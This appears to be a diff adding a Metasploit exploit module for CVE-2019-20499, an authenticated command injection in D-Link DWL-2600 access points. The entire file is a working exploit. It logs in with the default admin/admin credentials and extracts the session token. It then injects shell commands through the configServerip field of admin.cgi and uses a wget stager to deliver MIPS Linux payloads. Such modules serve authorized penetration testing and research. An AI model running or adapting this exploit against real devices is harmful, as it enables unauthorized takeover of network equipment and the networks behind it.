@@ -1,0 +1,138 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'DLINK DWL-2600 Authenticated Remote Command Injection',
+      'Description' => %q{
+          Some DLINK Access Points are vulnerable to an authenticated OS command injection.
+          Default credentials for the web interface are admin/admin.
+      },
+      'Author'      =>
+        [
+          'RAKI BEN HAMOUDA', # Vulnerability discovery and original research
+          'Nick Starke' # Metasploit Module
+        ],
+      'License'     => MSF_LICENSE,
+      'References'  =>
+        [
+          [ 'CVE', '2019-20499' ],
+          [ 'EDB', '46841' ]
+        ],
+      'DisclosureDate' => 'May 15 2019',
+      'Privileged'     => true,
+      'Platform'       => %w{ linux unix },
+      'Payload'        =>
+        {
+          'DisableNops' => true,
+          'BadChars' => "\x00"
+        },
+      'CmdStagerFlavor' => :wget,
+      'Targets'        =>
+        [
+          [ 'CMD',
+            {
+            'Arch' => ARCH_CMD,
+            'Platform' => 'unix'
+            }
+          ],
+          [ 'Linux mips Payload',
+            {
+            'Arch' => ARCH_MIPSLE,
+            'Platform' => 'linux'
+            }
+          ],
+        ],
+      'DefaultTarget'  => 1
+      ))
+
+    register_options(
+      [
+        OptString.new('HttpUsername', [ true, 'The username to authenticate as', 'admin' ]),
+        OptString.new('HttpPassword', [ true, 'The password for the specified username', 'admin' ]),
+        OptString.new('TARGETURI', [ true, 'Base path to the Dlink web interface', '/' ])
+      ])
+  end
+
+  def execute_command(cmd, opts={})
+    bogus = Rex::Text.rand_text_alpha(rand(10))
+
+    post_data = Rex::MIME::Message.new
+    post_data.add_part("up", nil, nil, "form-data; name=\"optprotocol\"")
+    post_data.add_part(bogus, nil, nil, "form-data; name=\"configRestore\"")
+    post_data.add_part("; #{cmd} ;", nil, nil, "form-data; name=\"configServerip\"")
+
+    print_status("Sending CGI payload using token: #{@token}") # Note token is an instance variable now
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, 'admin.cgi'),
+      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
+      'cookie' => "sessionHTTP=#{@token};",
+      'data'   => post_data.to_s,
+      'query'  => 'action=config_restore'
+    })
+
+    unless res || res.code != 200
+      fail_with(Failure::UnexpectedReply, "Command wasn't executed, aborting!")
+    end
+
+  rescue ::Rex::ConnectionError
+    vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
+    return
+  end
+
+  def exploit
+    user = datastore['HttpUsername']
+    pass = datastore['HttpPassword']
+    rhost = datastore['RHOST']
+    rport = datastore['RPORT']
+
+    print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
+    res = send_request_cgi({
+      'uri'    => normalize_uri(target_uri.path, '/admin.cgi'),
+      'method' => 'POST',
+      'vars_post'   => {
+        'i_username' => user,
+        'i_password' => pass,
+        'login'      => 'Logon'
+      }
+    })
+
+    unless res && res.code != 404
+      fail_with(Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
+    end
+
+    unless [200, 301, 302].include?(res.code)
+      fail_with(Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
+    end
+
+    print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
+
+    delstart = 'var cookieValue = "'
+    tokenoffset = res.body.index(delstart) + delstart.size
+    endoffset = res.body.index('";', tokenoffset)
+    @token = res.body[tokenoffset, endoffset - tokenoffset]
+
+    if @token.empty?
+      fail_with(Failure::NoAccess, "#{peer} - No Auth token received")
+    end
+
+    print_good("#{peer} - Received Auth token: #{@token}")
+    if target.name =~ /CMD/
+      unless datastore['CMD']
+        fail_with(Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
+      end
+      execute_command(payload.encoded)
+    else
+      execute_cmdstager(linemax: 100, noconcat: true)
+    end
+  end
+end
